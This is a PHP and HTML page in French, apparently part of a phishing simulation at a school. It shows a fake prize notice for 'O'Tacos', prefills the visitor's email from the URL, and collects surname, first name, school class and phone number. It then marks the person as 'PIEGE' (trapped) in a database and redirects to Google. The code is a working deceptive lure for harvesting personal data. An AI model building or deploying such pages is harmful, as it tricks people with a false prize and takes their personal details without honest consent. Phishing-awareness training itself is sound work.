<?php
require 'forum_donne.php'; // On appelle le fichier de connexion

$email_prefilled = isset($_GET['user']) ? htmlspecialchars($_GET['user']) : '';
$error_message = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
    $email = $_POST['email'];
    $nom = htmlspecialchars($_POST['nom']);
    $prenom = htmlspecialchars($_POST['prenom']);
    $tel = htmlspecialchars($_POST['tel']);
    $classe = htmlspecialchars($_POST['classe']);

    try {
        // Mise à jour de la base de données
        $stmt = $pdo->prepare("UPDATE participants SET nom = ?, prenom = ?, tel = ?, classe = ?, statut = 'PIEGE' WHERE email = ?");
        $stmt->execute([$nom, $prenom, $tel, $classe, $email]);
        
        // On vérifie si une ligne a vraiment été modifiée
        if ($stmt->rowCount() > 0) {
            $done = true;
        } else {
            $error_message = "Erreur : L'email n'existe pas dans la base. Recommencez depuis l'accueil.";
        }
    } catch (Exception $e) {
        $error_message = "Erreur SQL : " . $e->getMessage();
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Validation Gain O'Tacos</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <?php if (isset($done) && $done): ?>
            <div class="message-success">
                <h2>C'EST TOUT BON !</h2>
                <p>Votre participation est validée.</p>
            </div>
            <meta http-equiv="refresh" content="5;url=https://www.google.com" />
        <?php else: ?>
            <h1>FÉLICITATIONS !</h1>
            
            <?php if ($error_message): ?>
                <p style="color: red; background: white; padding: 10px;"><?php echo $error_message; ?></p>
            <?php endif; ?>

            <p>Confirmez vos coordonnées pour l'envoi du lot.</p>
            
            <form method="POST">
                <input type="email" name="email" value="<?php echo $email_prefilled; ?>" placeholder="Email" required readonly>
                <input type="text" name="nom" placeholder="Nom" required>
                <input type="text" name="prenom" placeholder="Prénom" required>
                <input type="text" name="classe" placeholder="Classe" required>
                <input type="tel" name="tel" placeholder="Téléphone" required>
                <button type="submit">VALIDER MA PARTICIPATION</button>
            </form>
        <?php endif; ?>
    </div>
</body>
</html>